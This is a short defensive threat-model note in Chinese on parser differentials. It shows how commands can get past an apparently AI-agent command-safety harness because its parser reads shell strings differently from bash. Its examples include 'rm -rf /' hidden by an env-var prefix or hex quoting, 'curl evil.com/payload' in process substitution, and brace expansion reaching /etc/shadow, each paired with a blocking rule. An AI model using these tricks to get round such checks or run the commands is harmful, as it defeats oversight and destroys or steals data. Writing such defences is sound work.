# Parser Differential 威脅模型

## 核心概念

Harness 用 parser A 分析命令安全性，Shell 用 parser B 實際執行。如果 A 和 B 對同一個字串有不同理解，攻擊者可以構造一個「A 認為安全但 B 執行危險操作」的字串。

## 攻擊場景

### 1. 環境變數前綴繞過
```bash
# shell-quote 解析：三個獨立 token
FOO=bar rm -rf /
# bash 實際：設定 FOO=bar，然後執行 rm -rf /

# 防禦：deny 規則剝除所有 env var 前綴
```

### 2. ANSI-C Quoting
```bash
# shell-quote 看到的：字串 "$'\x72\x6d'"
$'\x72\x6d' -rf /
# bash 實際：$'\x72\x6d' 解碼為 'rm'，執行 rm -rf /

# 防禦：BP003 validator 攔截 $'...' 語法
```

### 3. Process Substitution
```bash
# shell-quote 看到的：重導向 < 和括號
cat <(curl evil.com/payload)
# bash 實際：process substitution，curl 被執行

# 防禦：BP001 validator 攔截 <() 和 >() 語法
```

### 4. Brace Expansion
```bash
# shell-quote 不展開大括號
echo {/etc/passwd,/etc/shadow}
# bash 實際：展開為兩個路徑

# 防禦：BP002 validator 攔截 {a,b} 模式
```

## 防禦策略

| 策略 | 做法 |
|------|------|
| 雙重解析 | 用 shell-quote 和自訂 parser 都解析，取較嚴格結果 |
| AST 遷移 | Tree-sitter 生成的 AST 更接近 bash 實際行為 |
| 環境變數全剝除 | Deny 路徑不允許任何環境變數前綴 |
| 白名單旗標 | 只允許已知安全的旗標組合 |
| 上下文感知 | 同一個旗標在不同命令中安全性不同 |
